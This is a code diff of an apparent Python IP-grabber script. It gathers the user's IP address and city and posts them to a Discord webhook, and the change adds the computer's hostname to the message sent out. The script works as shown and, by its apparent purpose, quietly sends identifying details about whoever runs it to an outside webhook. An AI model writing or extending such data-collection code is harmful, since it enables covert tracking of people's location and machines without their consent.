@@ -1,4 +1,5 @@
 import requests
+import platform
 
 def get_ip_info():
     try:
@@ -15,13 +16,16 @@ def send_to_discord(webhook_url, ip_info):
         print("No IP information available to send.")
         return
 
+    # Get the PC name (hostname)
+    pc_name = platform.node()
+
     # Preparing data for Discord
     data = {
-        "content": "IP Information",
+        "content": pc_name,  # Use the PC name as the message content
         "embeds": [
             {
                 "title": "User IP Details",
-                "description": "Here is the user's IP information.",
+                "description": f"Here is the IP information for {pc_name}.",
                 "fields": [
                     {"name": "IP", "value": ip_info.get("ip", "N/A")},
                     {"name": "City", "value": ip_info.get("city", "N/A")},
